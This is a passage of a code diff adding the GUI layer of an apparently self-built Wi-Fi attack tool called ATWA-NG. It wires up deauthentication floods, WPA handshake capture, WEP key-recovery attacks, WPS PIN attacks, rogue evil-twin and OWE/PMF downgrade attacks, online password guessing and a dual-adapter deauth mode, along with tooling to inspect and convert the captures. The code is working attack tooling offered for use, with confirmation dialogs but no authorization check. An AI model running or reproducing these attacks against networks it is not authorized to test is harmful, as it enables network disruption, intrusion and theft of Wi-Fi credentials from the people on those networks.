+            return
+
+        def work():
+            result = self._runner().handshake(ap)
+            if "authorized" in result.lower():
+                self._queue.put(("info", f"AUTHORIZED handshake captured for {ap.bssid} ({ap.ssid or '<hidden>'}).\n{result}"))
+            return result
+
+        self._run_bg(f"Handshake capture on {ap.bssid}", work)
+
+    def _attack_smart(self):
+        ap = self._require_target()
+        if not ap:
+            return
+        if not self._confirm_attack("Smart Attack", f"Run full Smart Attack chain against {ap.bssid} ({ap.ssid or '<hidden>'}) — includes deauth rounds."):
+            return
+        self._run_bg(f"Smart Attack on {ap.bssid}", self._runner().smart, ap)
+
+    def _attack_omni(self):
+        ap = self._require_target()
+        if not ap:
+            return
+        if not self._confirm_attack("OMNI Attack", f"Run full OMNI Attack chain against {ap.bssid} ({ap.ssid or '<hidden>'}) — includes deauth rounds."):
+            return
+        self._run_bg(f"OMNI Attack on {ap.bssid}", self._runner().omni, ap)
+
+    def _attack_wep(self):
+        ap = self._require_target()
+        if not ap:
+            return
+        if not ap.ssid:
+            messagebox.showwarning("ATWA-NG", "WEP attack needs a known SSID (this AP's SSID hasn't been seen yet).")
+            return
+        if not self.own_mac:
+            messagebox.showwarning("ATWA-NG", "Own MAC not known yet — restart monitor mode.")
+            return
+        key_len = 13
+        if not messagebox.askyesno("ATWA-NG", "WEP attack: use WEP-104 (13-byte key)? Choose No for WEP-40 (5-byte)."):
+            key_len = 5
+        if not self._confirm_attack("WEP Attack", f"Fake-auth + ARP replay + PTW key recovery against {ap.bssid} ({ap.ssid})."):
+            return
+        self._run_bg(f"WEP attack on {ap.bssid}", self._runner().wep, ap, key_len)
+
+    def _attack_caffe_latte(self):
+        ap = self._require_target()
+        if not ap:
+            return
+        if not ap.clients:
+            messagebox.showwarning("ATWA-NG", "Caffe Latte needs a visible client — lock a WEP AP with at least one client listed.")
+            return
+        client_mac = next(iter(ap.clients))
+        key_len = 13 if messagebox.askyesno("ATWA-NG", "WEP Caffe Latte: use WEP-104 (13-byte)? No = WEP-40 (5-byte).") else 5
+        if not self._confirm_attack(
+            "WEP Caffe Latte",
+            f"Client-only WEP attack against {client_mac} (client of {ap.bssid}).\n"
+            "No AP association needed — replays client ARPs to collect IVs.",
+        ):
+            return
+        self._run_bg(f"Caffe Latte on {client_mac}", self._runner().caffe_latte, client_mac, ap, key_len)
+
+    def _attack_hirte(self):
+        ap = self._require_target()
+        if not ap or not ap.clients:
+            messagebox.showwarning("ATWA-NG", "Hirte needs a visible client on an ad-hoc/IBSS WEP target.")
+            return
+        client_mac = next(iter(ap.clients))
+        key_len = 13 if messagebox.askyesno("ATWA-NG", "WEP Hirte: use WEP-104 (13-byte)? No = WEP-40 (5-byte).") else 5
+        if not self._confirm_attack(
+            "WEP Hirte",
+            f"IBSS/client-only WEP attack against {client_mac} (client of {ap.bssid}).\n"
+            "Replays the captured client frame with IBSS DS flags and collects fresh IVs.",
+        ):
+            return
+        self._run_bg(f"Hirte on {client_mac}", self._runner().hirte, client_mac, ap, key_len)
+
+    def _attack_chopchop(self):
+        """The native from-scratch chopchop (ICV-correction math) was
+        confirmed broken by two independent offline verification tests and
+        later deleted (2026-09-14) -- see the note above
+        attacks/wep_client.py's chopchop_vendor(). This drives the
+        project's own vendored/self-compiled aireplay-ng's real
+        -4/--chopchop mode instead (chopchop_vendor(), wired via
+        AttackRunner.chopchop())."""
+        ap = self._require_target()
+        if not ap:
+            return
+        if not self.own_mac:
+            messagebox.showwarning("ATWA-NG", "Own MAC not known yet — restart monitor mode.")
+            return
+        if not self._confirm_attack(
+            "WEP Chopchop",
+            f"Chopchop decrypt against {ap.bssid} ({ap.ssid or '<hidden>'}) via the vendored "
+            "aireplay-ng -4/--chopchop.\nRequires a genuine WEP AP with WEP data traffic — "
+            "a WPA/WPA2-only target (or a silent one) will just run out the clock.",
+        ):
+            return
+        self._run_bg(f"WEP Chopchop on {ap.bssid}", self._runner().chopchop, ap)
+
+    def _attack_wps_null_pin(self):
+        ap = self._require_target()
+        if not ap:
+            return
+        if not ap.ssid:
+            messagebox.showwarning("ATWA-NG", "WPS attack needs a known SSID.")
+            return
+        if not self._confirm_attack("WPS Null-PIN", f"One-shot null-PIN attempt against {ap.bssid} ({ap.ssid})."):
+            return
+        self._run_bg(f"WPS null-PIN on {ap.bssid}", self._runner().wps_null_pin, ap)
+
+    def _attack_wps_pixie(self):
+        ap = self._require_target()
+        if not ap:
+            return
+        if not ap.ssid:
+            messagebox.showwarning("ATWA-NG", "WPS attack needs a known SSID.")
+            return
+        if not self._confirm_attack(
+            "WPS Pixie-Dust",
+            f"Offline pixie-dust against {ap.bssid} ({ap.ssid}).\n"
+            "Requires one M1→M3 exchange to capture crypto material.",
+        ):
+            return
+        self._run_bg(f"WPS pixie-dust on {ap.bssid}", self._runner().wps_pixie, ap)
+
+    def _attack_wps_bruteforce(self):
+        ap = self._require_target()
+        if not ap:
+            return
+        if not ap.ssid:
+            messagebox.showwarning("ATWA-NG", "WPS attack needs a known SSID.")
+            return
+        warned = messagebox.askokcancel(
+            "ATWA-NG",
+            "WPS bruteforce is currently EXPERIMENTAL — across multiple live sessions "
+            "it has never completed a real M2→M3 exchange against a test AP (see "
+            "STATUS.md). It may just time out repeatedly. Continue anyway?",
+        )
+        if not warned:
+            return
+        self._run_bg(f"WPS bruteforce on {ap.bssid}", self._runner().wps_bruteforce, ap)
+
+    def _stop_attack(self):
+        self._stop_event.set()
+        self.auto_deauth_var.set(False)
+        if hasattr(self, "_auto_deauth_stop"):
+            self._auto_deauth_stop.set()
+        self._auto_deauth_client = None
+        crack_proc = self._crack_proc_holder.get("proc")
+        if crack_proc is not None and crack_proc.poll() is None:
+            self._log("stop requested: terminating the running crack process (John/aircrack-ng)")
+
+            def escalate(proc=crack_proc):
+                # SIGTERM alone isn't reliable -- a live test against
+                # aircrack-ng showed it can catch SIGTERM, print "Quitting
+                # aircrack-ng..." repeatedly, and never actually exit.
+                # SIGKILL can't be caught, so escalate to it after a grace
+                # period. And with john --fork=N, signaling only the leader
+                # orphans the worker children -- terminate_tree() signals the
+                # whole process group. Run off the Tk thread so the UI
+                # doesn't block.
+                from ..crack.john import terminate_tree
+
+                terminate_tree(proc, grace=3.0)
+
+            threading.Thread(target=escalate, daemon=True).start()
+        self._log("stop requested — aborting the running attack (deauth bursts and online-guess "
+                   "abort within a fraction of a second; OMNI/Smart/WPS loops exit at their next "
+                   "round check; a crack subprocess is terminated above)")
+
+    def _stop_cracking(self):
+        """Dedicated Stop button for the Captures panel -- the generic
+        'Stop Attack' button lives in the Attacks tab and isn't visible
+        while cracking from here, which was the actual complaint (not that
+        stopping didn't work). Same termination path as _stop_attack."""
+        self._stop_attack()
+
+    def _start_auto_deauth(self, ap: AccessPoint, client: str | None = None):
+        if self._busy or (self._auto_deauth_thread is not None and self._auto_deauth_thread.is_alive()):
+            messagebox.showwarning("ATWA-NG", "Another attack is already running. Use Stop Attack first.")
+            self.auto_deauth_var.set(False)
+            return
+        from ..attacks.logic import select_client
+
+        target = select_client(ap, client)
+        self._auto_deauth_stop = threading.Event()
+        self._auto_deauth_client = None if target == "ff:ff:ff:ff:ff:ff" else target
+        interval = int(self.deauth_interval_var.get())
+        target_desc = self._auto_deauth_client or "broadcast"
+        self._log(
+            f"auto-deauth started for {target_desc} on {ap.bssid} "
+            f"(every {interval}s, stops on CHALLENGE or AUTHORIZED capture)"
+        )
+        self._auto_deauth_thread = threading.Thread(
+            target=self._auto_deauth_run,
+            args=(ap, self._auto_deauth_client, interval, self._auto_deauth_stop),
+            daemon=True,
+        )
+        self._auto_deauth_thread.start()
+
+    def _toggle_auto_deauth(self):
+        """Auto-deauth uses the selected client station, or the strongest
+        observed client when no client row is selected. The AP BSSID remains
+        the capture/filter identity; the station MAC is only the deauth
+        destination."""
+        if not self.auto_deauth_var.get():
+            if hasattr(self, "_auto_deauth_stop"):
+                self._auto_deauth_stop.set()
+            self._log("auto-deauth stopped")
+            return
+        ap = self._require_target()
+        if not ap:
+            self.auto_deauth_var.set(False)
+            return
+        self._start_auto_deauth(ap, self._selected_client())
+
+    def _format_capture_size(self, size: int | None) -> str:
+        if size is None:
+            return ""
+        if size < 1024:
+            return f"Capture: {size} B"
+        if size < 1024 ** 2:
+            return f"Capture: {size / 1024:.1f} KB"
+        return f"Capture: {size / 1024 ** 2:.1f} MB"
+
+    def _watch_capture_size(self, path, stop_event: threading.Event):
+        """A live-growing capture-size readout (0 B -> ... KB) next to
+        the signal graph, confirming data is actually landing on disk
+        during a capture — not just that an attack is 'running'."""
+        import time as _time
+        from pathlib import Path
+
+        p = Path(path)
+        while not stop_event.is_set():
+            try:
+                size = p.stat().st_size if p.exists() else 0
+            except OSError:
+                size = 0
+            self._queue.put(("capture_size", size))
+            _time.sleep(1)
+        self._queue.put(("capture_size", None))
+
+    def _auto_deauth_run(
+        self,
+        ap: AccessPoint,
+        client: str | None,
+        interval: int,
+        stop_event: threading.Event,
+    ):
+        assert self.mon_iface is not None
+        assert ap.channel is not None
+        import time as _time
+
+        from ..attacks.deauth import deauth
+        from ..attacks.handshake import (
+            HandshakeCapture,
+            HandshakeStatus,
+            capture_handshake,
+        )
+        from ..attacks.logic import best_status, run_deauth_flow, select_client
+        from ..storage import target_capture_dir
+
+        if ap.pmf == "required":
+            self._log("auto-deauth: PMF required — deauth would be dropped, skipping round loop entirely")
+            self._queue.put(("auto_deauth_done", None))
+            return
+
+        max_rounds = 6
+        out_dir = target_capture_dir(ap.ssid, ap.bssid)
+        out_file = out_dir / f"autodeauth_{int(_time.time())}.pcap"
+        cap = HandshakeCapture()
+
+        def listen():
+            capture_handshake(
+                self.mon_iface, ap.bssid, channel=ap.channel,
+                timeout=interval * max_rounds + 10, outfile=str(out_file),
+                stop_event=stop_event, progress_fn=self._log, cap=cap,
+            )
+
+        def safe_deauth(iface, bssid, client, count, channel, reason, progress_fn=None):
+            # auto-deauth's loop must survive per-round errors (e.g. a
+            # radio.RadioError from deauth()'s own ensure_monitor_mode()
+            # call if the interface drops mid-run) -- run_deauth_flow
+            # itself doesn't wrap deauth_fn, so this does.
+            try:
+                return deauth(iface, bssid, client=client, count=count, channel=channel, reason=reason, progress_fn=progress_fn, stop_event=stop_event)
+            except Exception as exc:  # noqa: BLE001
+                (progress_fn or self._log)(f"auto-deauth round failed: {exc}")
+                return 0
+
+        # Marks mon_iface busy so the background scan loop (_start_scan)
+        # stops opening its own competing sniff() socket on the same
+        # interface for the duration of this run — this bypasses _run_bg
+        # (toggle checkbox, not a one-shot attack), so it never set
+        # self._busy before, letting the scan loop's per-hop socket churn
+        # starve both the deauth TX and the handshake-capture RX.
+        self._queue.put(("busy", True))
+        try:
+            listener = threading.Thread(target=listen, daemon=True)
+            listener.start()
+            watch_stop = threading.Event()
+            threading.Thread(target=self._watch_capture_size, args=(out_file, watch_stop), daemon=True).start()
+
+            # The caller may have selected a client row. Keep the AP BSSID as
+            # the capture/filter identity, but pass the selected station MAC
+            # through as the directed deauth destination.
+            client = select_client(ap, preferred=client)
+            # burst_size=64 keeps auto-deauth's existing frame count -- see
+            # attacks/logic.py; History.md, 2026-09-13.
+            run_deauth_flow(
+                safe_deauth, self.mon_iface, ap, client, cap,
+                max_rounds=max_rounds, round_interval=interval, burst_size=64,
+                min_status=HandshakeStatus.CHALLENGE,
+                stop_event=stop_event, progress_fn=self._log,
+            )
+
+            listener.join(timeout=5)
+            watch_stop.set()
+            status = best_status(cap)
+            if status is HandshakeStatus.AUTHORIZED:
+                self._log(f"auto-deauth: AUTHORIZED handshake captured -> {out_file}")
+            elif status is HandshakeStatus.CHALLENGE:
+                self._log(f"auto-deauth: CHALLENGE handshake captured (unverified by AP) -> {out_file}")
+            else:
+                self._log("auto-deauth: stopped or exhausted rounds, no handshake material captured")
+        finally:
+            self._queue.put(("busy", False))
+            self._queue.put(("auto_deauth_done", None))
+            self._auto_deauth_client = None
+
+    def _attack_downgrade_twin(self):
+        ap = self._require_target()
+        if not ap:
+            return
+        if not ap.ssid:
+            messagebox.showwarning("ATWA-NG", "Downgrade Twin needs a known SSID.")
+            return
+        iface_ap = self.iface_ap_var.get().strip()
+        if not iface_ap:
+            messagebox.showerror(
+                "ATWA-NG",
+                "No AP interface configured.\n\n"
+                "Pick one in the toolbar's 'AP iface' dropdown (the ACHM "
+                "adapter, in managed mode, distinct from the scan/monitor "
+                "adapter).",
+            )
+            return
+        if iface_ap == self.mon_iface:
+            messagebox.showerror(
+                "ATWA-NG",
+                f"AP interface ({iface_ap}) is the same as the monitor "
+                f"interface ({self.mon_iface}).\n\n"
+                "Downgrade Twin needs two separate adapters: one to host "
+                "the rogue twin, one to stay in monitor mode for deauth.",
+            )
+            return
+        if not self._confirm_attack(
+            "Downgrade Twin",
+            f"Portal-free WPA2-only rogue twin of {ap.bssid} ({ap.ssid}).\n\n"
+            f"AP interface: {iface_ap}  |  Monitor: {self.mon_iface}\n"
+            "Will deauth real clients and passively capture a 4-way "
+            "handshake if one reconnects to the twin using its real "
+            "password. No captive portal.",
+        ):
+            return
+        self._run_bg(f"Downgrade Twin on {ap.bssid}", self._runner().downgrade_twin, ap, iface_ap)
+
+    def _attack_pmf_bypass(self):
+        ap = self._require_target()
+        if not ap or not ap.ssid:
+            messagebox.showwarning("ATWA-NG", "PMF Bypass needs a selected target with a known SSID.")
+            return
+        iface_ap = self.iface_ap_var.get().strip()
+        if not iface_ap or iface_ap == self.mon_iface:
+            messagebox.showerror("ATWA-NG", "PMF Bypass needs a separate AP interface from the monitor interface.")
+            return
+        if not self._confirm_attack(
+            "PMF Bypass Reconnect",
+            f"Portal-free PMF-required rogue twin of {ap.bssid} ({ap.ssid}).\n\n"
+            f"AP interface: {iface_ap}  |  Monitor: {self.mon_iface}\n"
+            "Will wait for a client to associate, inject the malformed EAPOL "
+            "reconnect stimulus, and capture the resulting handshake.",
+        ):
+            return
+        self._run_bg(f"PMF Bypass on {ap.bssid}", self._runner().pmf_bypass, ap, iface_ap)
+
+    def _attack_owe_downgrade(self):
+        ap = self._require_target()
+        if not ap:
+            return
+        if not ap.owe_transition_ssid:
+            messagebox.showwarning(
+                "ATWA-NG",
+                "OWE Downgrade needs a target with an OWE Transition Mode IE "
+                "(a paired open SSID advertised alongside it) -- this AP "
+                "doesn't have one.",
+            )
+            return
+        iface_ap = self.iface_ap_var.get().strip()
+        if not iface_ap:
+            messagebox.showerror(
+                "ATWA-NG",
+                "No AP interface configured.\n\n"
+                "Pick one in the toolbar's 'AP iface' dropdown (the ACHM "
+                "adapter, in managed mode, distinct from the scan/monitor "
+                "adapter).",
+            )
+            return
+        if iface_ap == self.mon_iface:
+            messagebox.showerror(
+                "ATWA-NG",
+                f"AP interface ({iface_ap}) is the same as the monitor "
+                f"interface ({self.mon_iface}).\n\n"
+                "OWE Downgrade needs two separate adapters: one to host "
+                "the rogue open twin, one to stay in monitor mode for "
+                "deauth.",
+            )
+            return
+        if not self._confirm_attack(
+            "OWE Downgrade",
+            f"Rogue open twin of the paired network {ap.owe_transition_ssid!r}, "
+            f"deauthing clients off the real OWE AP {ap.bssid}.\n\n"
+            f"AP interface: {iface_ap}  |  Monitor: {self.mon_iface}\n"
+            "Clients falling back to the open twin lose OWE encryption "
+            "entirely. No captive portal.",
+        ):
+            return
+        self._run_bg(f"OWE Downgrade on {ap.bssid}", self._runner().owe_downgrade, ap, iface_ap)
+
+    def _attack_online_guess(self):
+        """Live per-password 4-way handshake attempt against the AP itself
+        (attacks/online.py) -- the standalone version of OMNI's ONLINE
+        stage, for running it on its own instead of the full chain (e.g.
+        PMF blocks the HANDSHAKE stage's deauth, so this is a way to still
+        try a wordlist against the target)."""
+        ap = self._require_target()
+        if not ap:
+            return
+        if not ap.ssid:
+            messagebox.showwarning("ATWA-NG", "Online guessing needs a known SSID.")
+            return
+        if ap.security not in ("WPA", "WPA2", "transition"):
+            messagebox.showwarning(
+                "ATWA-NG",
+                f"Online guessing needs a PSK-based network (WPA/WPA2/transition) — "
+                f"this target is {ap.security}. WPA3/SAE-only and WEP aren't supported "
+                "(see attacks/online.py).",
+            )
+            return
+        if not self.own_mac:
+            messagebox.showwarning("ATWA-NG", "Own MAC not known yet — restart monitor mode.")
+            return
+        wordlist = self.wordlist_var.get()
+        if not wordlist:
+            messagebox.showwarning("ATWA-NG", "Set a wordlist first (File > Set Wordlist).")
+            return
+        if not self._confirm_attack(
+            "Online Password Guess",
+            f"Live password guessing against {ap.bssid} ({ap.ssid}) using {wordlist}.\n\n"
+            "Slow by design (one real association + 4-way handshake per candidate, "
+            "~1-3s each) and noisy — every attempt is visible to the AP.",
+        ):
+            return
+        self._run_bg(f"Online guess on {ap.bssid}", self._runner().online_guess, ap)
+
+    def _attack_dragonblood(self):
+        """SAE (WPA3) timing side-channel wordlist pruning (CVE-2019-9494,
+        attacks/dragonblood.py) -- only meaningful against an unpatched
+        pre-hostapd-2.10 AP (mid-2019), and its core KDF math is flagged
+        unverified against a real spec/capture (see that module's
+        docstring). Confirm dialog says so up front rather than presenting
+        this as a proven working attack."""
+        ap = self._require_target()
+        if not ap:
+            return
+        if ap.security not in ("WPA3", "transition"):
+            messagebox.showwarning(
+                "ATWA-NG",
+                f"Dragonblood targets SAE (WPA3) — this AP is {ap.security}, which doesn't "
+                "run the SAE handshake this timing side-channel needs.",
+            )
+            return
+        wordlist = self.wordlist_var.get()
+        if not wordlist:
+            messagebox.showwarning("ATWA-NG", "Set a wordlist first (File > Set Wordlist).")
+            return
+        if not self._confirm_attack(
+            "Dragonblood",
+            f"SAE timing side-channel wordlist pruning against {ap.bssid} ({ap.ssid}).\n\n"
+            "⚠ Only works against an UNPATCHED AP (pre-hostapd-2.10, mid-2019) — modern "
+            "APs run a fixed-time loop with no timing signal to measure.\n"
+            "⚠ The core math (KDF byte layout) is unit-tested for internal consistency "
+            "only, NOT verified against the real spec or a real capture — treat pruning "
+            "results with real skepticism.\n\n"
+            f"Sends several SAE Commit frames from spoofed MACs and measures reply timing "
+            f"using {wordlist}.",
+        ):
+            return
+        self._run_bg(f"Dragonblood on {ap.bssid}", self._runner().dragonblood, ap)
+
+    def _attack_pincer(self):
+        """Flagship dual-Alfa mode (STATUS.md 'Ideas/undecided', 2026-08-14
+        — one special locked/hidden attack, not folded into the default
+        single-adapter path). Split-role, proven live that session: the
+        AWUS036ACHM (mt76x0u, wider scan range) stays parked on the
+        target's channel doing nothing but listen for the handshake, while
+        the AWUS1900/RTL8814AU (rtw88_8814au, 3x3 antennas) does nothing but hammer
+        deauth — neither radio ever time-shares between scanning and
+        attacking, unlike single-adapter mode. Gated entirely on
+        radio.detect_alfa_pair(); the menu entry is disabled without both
+        specific adapters present."""
+        ap = self._require_target()
+        if not ap:
+            return
+        if not self.alfa_pair:
+            messagebox.showwarning("ATWA-NG", "PINCER needs both Alfa adapters connected (AWUS036ACHM + AWUS1900).")
+            return
+        scan_iface, attack_iface = self.alfa_pair
+        if ap.pmf == "required":
+            radio_note = (
+                "PMF is required on this target, so deauth would be dropped anyway — "
+                "PINCER will skip the attack entirely and leave both radios untouched."
+            )
+        else:
+            radio_note = "Both radios go to monitor mode and back when done."
+        if not self._confirm_attack(
+            "PINCER (Dual-Alfa)",
+            f"{scan_iface} listens on {ap.bssid} ({ap.ssid or '<hidden>'}) while {attack_iface} "
+            f"deauths continuously. {radio_note}",
+        ):
+            return
+        self._run_bg(
+            f"PINCER on {ap.bssid}",
+            self._runner().pincer,
+            ap, scan_iface, attack_iface, self.randomize_mac_var.get(),
+            self._watch_capture_size,
+        )
+
+    # ------------------------------------------------------------------
+
+    # ------------------------------------------------------------------
+    # Captures tab
+    # ------------------------------------------------------------------
+    def _capture_files(self):
+        from pathlib import Path
+
+        root = Path(self.capture_dir_var.get())
+        if not root.exists():
+            return []
+        suffixes = {".cap", ".pcap", ".pcapng", ".22000"}
+        files = []
+        for path in root.rglob("*"):
+            if not path.is_file() or path.suffix.lower() not in suffixes:
+                continue
+            try:
+                stat = path.stat()
+            except OSError:
+                continue
+            files.append((path, stat.st_size, stat.st_mtime))
+        return sorted(files, key=lambda item: item[2], reverse=True)
+
+    def _refresh_captures(self):
+        """The scan (_capture_files' rglob + stat over the whole capture
+        tree) can take a long time on a large/deep directory — running it
+        synchronously on the Tk thread froze the entire GUI (2026-08-28
+        user report: switching capture dir "completely freezes" it).
+        Walk off-thread, populate the tree once the listing comes back."""
+        if self._captures_refreshing:
+            return
+        self._captures_refreshing = True
+
+        def work():
+            try:
+                files = self._capture_files()
+            except Exception:  # noqa: BLE001 - never let a bad dir kill the thread silently
+                files = []
+            self._queue.put(("captures_ready", files))
+
+        threading.Thread(target=work, daemon=True).start()
+
+    def _populate_capture_tree(self, files: list):
+        self._captures_refreshing = False
+        new_ids = {str(path) for path, _size, _mtime in files}
+        for iid in set(self.capture_tree.get_children()) - new_ids:
+            self.capture_tree.delete(iid)
+        for i, (path, size, _mtime) in enumerate(files):
+            size_str = f"{size} B" if size < 1024 else f"{size / 1024:.1f} KB" if size < 1024 ** 2 else f"{size / 1024 ** 2:.1f} MB"
+            kind = "hash" if path.suffix.lower() == ".22000" else "capture"
+            band_tag = "row_even" if i % 2 == 0 else "row_odd"
+            iid = str(path)
+            values = (path.name, kind, size_str, str(path))
+            if self.capture_tree.exists(iid):
+                if self.capture_tree.item(iid, "values") != values:
+                    self.capture_tree.item(iid, values=values)
+                self.capture_tree.item(iid, tags=(band_tag,))
+                self.capture_tree.move(iid, "", i)
+            else:
+                self.capture_tree.insert(
+                    "", tk.END, iid=iid, values=values, tags=(band_tag,),
+                )
+
+    def _selected_capture_paths(self) -> list[str]:
+        return list(self.capture_tree.selection())
+
+    def _on_capture_right_click(self, event):
+        row = self.capture_tree.identify_row(event.y)
+        if not row:
+            return
+        if row not in self.capture_tree.selection():
+            self.capture_tree.selection_set(row)
+        self._capture_copy_path()
+
+    def _capture_copy_path(self):
+        paths = self._selected_capture_paths()
+        if not paths:
+            messagebox.showwarning("ATWA-NG", "Select a capture first.")
+            return
+        self.root.clipboard_clear()
+        self.root.clipboard_append("\n".join(paths))
+        self.status_var.set(f"Copied {len(paths)} path(s) to clipboard")
+
+    def _inspect_hash_capture(self, path) -> tuple[str, bool]:
+        pmkid = handshake = 0
+        with path.open("r", encoding="utf-8", errors="replace") as fh:
+            for line in fh:
+                if line.startswith("WPA*01*"):
+                    pmkid += 1
+                elif line.startswith("WPA*02*"):
+                    handshake += 1
+        return f"{pmkid} PMKID line(s), {handshake} handshake line(s)", not (pmkid or handshake)
+
+    def _capture_inspect(self):
+        paths = self._selected_capture_paths()
+        if not paths:
+            messagebox.showwarning("ATWA-NG", "Select a capture first.")
+            return
+
+        def work():
+            from pathlib import Path
+
+            lines = []
+            for p in paths:
+                path = Path(p)
+                if path.suffix.lower() == ".22000":
+                    desc, _empty = self._inspect_hash_capture(path)
+                    lines.append(f"{path.name}: {desc}")
+                else:
+                    lines.append(f"{path.name}: {self._inspect_capture(path)}")
+            self._queue.put(("info", "\n".join(lines)))
+            return "inspected"
+
+        self._run_capture_task("Inspect capture(s)", work)
+
+    def _inspect_capture(self, path) -> str:
+        from scapy.utils import PcapReader
+
+        from ..attacks.handshake import HandshakeCapture, _classify
+        from ..attacks.pmkid import extract_pmkid
+        from ..frames import is_eapol
+
+        cap = HandshakeCapture()
+        pmkid_found = False
+        packet_count = 0
+        try:
+            # Stream one packet at a time. rdpcap() builds a complete
+            # Scapy PacketList, which made Inspect All's RAM usage scale
+            # with the largest capture instead of staying bounded.
+            with PcapReader(str(path)) as packets:
+                for pkt in packets:
+                    packet_count += 1
+                    if is_eapol(pkt) and extract_pmkid(bytes(pkt)):
+                        pmkid_found = True
+                    msg_no = _classify(pkt)
+                    if msg_no is not None and getattr(pkt, "addr3", None) and getattr(pkt, "addr1", None):
+                        ap, client = pkt.addr3, pkt.addr1 if msg_no % 2 == 1 else pkt.addr2
+                        cap.add(ap, client, msg_no)
+        except Exception as exc:  # noqa: BLE001 - capture parse failures are reported, not fatal
+            return f"could not parse ({exc})"
+        statuses = [cap.status(a, c).value for a, c in cap.messages]
+        parts = [f"{packet_count} packets"]
+        if pmkid_found:
+            parts.append("PMKID present")
+        usable_statuses = [status for status in statuses if status in {"challenge", "authorized"}]
+        if usable_statuses:
+            parts.append(f"handshake pairs={statuses}")
+        if not pmkid_found and not usable_statuses:
+            parts.append("no PMKID/handshake material found")
+        return ", ".join(parts)
+
+    def _show_scroll_dialog(self, title: str, text: str, *, buttons: tuple[str, ...] = ("OK",)) -> str | None:
+        """Fixed-size, word-wrapped, scrollable dialog -- messagebox.showinfo
+        grows unbounded-tall with one line per file, unreadable past a
+        handful of results (2026-08-28 user report)."""
+        dlg = tk.Toplevel(self.root)
+        dlg.title(title)
+        dlg.configure(bg=self.THEME["bg"])
+        dlg.geometry("560x480")
+        dlg.transient(self.root)
+        dlg.grab_set()
+
+        result: dict[str, str | None] = {"choice": None}
+
+        def choose(label: str | None) -> None:
+            result["choice"] = label
+            dlg.destroy()
+
+        # btn_row packed (and its space reserved) BEFORE text_frame, and
+        # anchored side=BOTTOM -- text_frame's fill=BOTH/expand=True below
+        # would otherwise claim all the fixed 560x480 window's space first
+        # and push the buttons off the bottom edge, invisible, on displays/
+        # themes where the text content renders taller than expected. Same
+        # bug, same fix as crack_dialog.py's Run/Stop/Close row (2026-08-28).
+        btn_row = ttk.Frame(dlg)
+        btn_row.pack(side=tk.BOTTOM, fill=tk.X, padx=8, pady=(0, 8))
+        for label in buttons:
+            style = "Accent.TButton" if label in ("OK", "Yes") else "TButton"
+            ttk.Button(btn_row, text=label, command=functools.partial(choose, label), style=style).pack(
+                side=tk.RIGHT, padx=4)
+
+        text_frame = ttk.Frame(dlg)
+        text_frame.pack(fill=tk.BOTH, expand=True, padx=8, pady=8)
+        txt = tk.Text(text_frame, wrap=tk.WORD, bg=self.THEME["panel_alt"], fg=self.THEME["bright"],
+                       insertbackground=self.THEME["bright"], relief="solid", borderwidth=1,
+                       highlightthickness=0, font=self.fonts["mono"])
+        scroll = ttk.Scrollbar(text_frame, orient=tk.VERTICAL, command=txt.yview)
+        txt.configure(yscrollcommand=scroll.set)
+        txt.pack(side=tk.LEFT, fill=tk.BOTH, expand=True)
+        scroll.pack(side=tk.RIGHT, fill=tk.Y)
+        txt.insert("1.0", text)
+        txt.configure(state=tk.DISABLED)
+        dlg.protocol("WM_DELETE_WINDOW", lambda: choose(None))
+        dlg.wait_visibility()
+        dlg.focus_set()
+        self.root.wait_window(dlg)
+        return result["choice"]
+
+    def _capture_inspect_all(self):
+        paths = [self.capture_tree.set(iid, "path") for iid in self.capture_tree.get_children()]
+        if not paths:
+            messagebox.showinfo("ATWA-NG", "No captures to inspect.")
+            return
+
+        def work():
+            from pathlib import Path
+
+            lines, unreadable, delete_candidates = [], [], []
+            for index, p in enumerate(paths, 1):
+                path = Path(p)
+                self._progress_fn(f"Inspecting {index}/{len(paths)}: {path.name}")
+                if path.suffix.lower() == ".22000":
+                    desc, empty = self._inspect_hash_capture(path)
+                    lines.append(f"{path.name}: {desc}")
+                    if empty:
+                        delete_candidates.append(p)
+                else:
+                    # A live channel-lock capture is intentionally incomplete;
+                    # never classify or delete it while the writer is active.
+                    if path.name.startswith("lock_") and self._lock_capture_proc is not None:
+                        lines.append(f"{path.name}: active channel-lock capture; skipped")
+                        continue
+                    desc = self._inspect_capture(path)
+                    lines.append(f"{path.name}: {desc}")
+                    if "could not parse" in desc:
+                        unreadable.append(p)
+                    elif "no PMKID/handshake material found" in desc:
+                        delete_candidates.append(p)
+
+            repaired, repair_failed, repair_errors = [], [], []
+            if unreadable:
+                from ..crack.convert import RepairUnavailableError, fix_capture
+
+                for index, p in enumerate(unreadable, 1):
+                    self._progress_fn(f"Repairing {index}/{len(unreadable)}: {Path(p).name}")
+                    try:
+                        out = fix_capture(p)
+                    except RepairUnavailableError as exc:
+                        # Do not delete when the repair tool itself is absent;
+                        # that is not evidence that the capture is unusable.
+                        repair_errors.append(f"{Path(p).name}: {exc}")
+                    except (RuntimeError, OSError) as exc:
+                        repair_failed.append(p)
+                        repair_errors.append(f"{Path(p).name}: {exc}")
+                    else:
+                        repaired.append((p, out))
+                        try:
+                            Path(p).unlink()
+                        except OSError as exc:
+                            repair_errors.append(f"{Path(p).name}: repaired but original could not be deleted ({exc})")
+                        else:
+                            delete_candidates.append(p)
+                        lines.append(f"{Path(p).name}: repaired -> {out}")
+                lines.append(
+                    f"Repair step: {len(repaired)} fixed, "
+                    f"{len(repair_failed)} unrepairable, {len(unreadable) - len(repaired)} not processed"
+                )
+                for error in repair_errors:
+                    lines.append(f"Repair failed: {error}")
+
+            deleted, delete_errors = [], []
+            for p in dict.fromkeys(delete_candidates):
+                try:
+                    Path(p).unlink()
+                except FileNotFoundError:
+                    continue
+                except OSError as exc:
+                    delete_errors.append(f"{Path(p).name}: {exc}")
+                else:
+                    deleted.append(p)
+            if deleted or delete_errors:
+                lines.append(f"Cleanup step: deleted {len(deleted)} unusable file(s)")
+            for error in delete_errors:
+                lines.append(f"Delete failed: {error}")
+            return (lines, repaired, deleted)
+
+        self._run_capture_task("Inspect all captures", work, result_kind="inspect_all_done")
+
+    def _on_inspect_all_done(self, payload):
+        lines, repaired, deleted = payload
+        self._show_scroll_dialog("Inspect All", "\n".join(lines))
+        if repaired or deleted:
+            self._refresh_captures()
+        if deleted:
+            self.status_var.set(f"Deleted {len(deleted)} unusable capture(s)")
+
+    def _capture_convert(self):
+        paths = self._selected_capture_paths()
+        if not paths:
+            messagebox.showwarning("ATWA-NG", "Select a .cap/.pcap/.pcapng file first.")
+            return
+        from ..crack.convert import cap_to_22000
+
+        def work():
+            results = []
+            for p in paths:
+                out = p + ".22000"
+                cap_to_22000(p, out)
+                results.append(out)
